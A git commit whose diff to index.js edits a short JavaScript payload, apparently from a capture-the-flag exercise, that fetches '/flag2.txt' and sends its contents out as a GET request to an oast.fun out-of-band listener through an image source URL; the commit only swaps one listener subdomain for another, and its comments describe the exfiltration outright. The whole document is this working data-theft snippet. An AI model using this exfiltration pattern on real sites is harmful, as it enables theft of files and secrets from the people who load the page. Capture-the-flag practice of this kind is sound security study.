d44faefffc781cda99f5a1c4aa2d1e001f1e074e
groupeProjectapp <chablaarbi707@gmail.com>
2025-04-24 17:13:41 +0100

    wtf

--- index.js
+++ index.js
@@ -2,5 +2,5 @@
     // fetch the flag file off the local filesystem
     const txt = await (await fetch('/flag2.txt')).text();
     // exfiltrate it as a GET to your listener
-    new Image().src = 'https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/?flag=' + encodeURIComponent(txt);
+    new Image().src = 'https://nntdfrlpiazffctldarunhkvwn0hvbn8v.oast.fun/?flag=' + encodeURIComponent(txt);
   })();
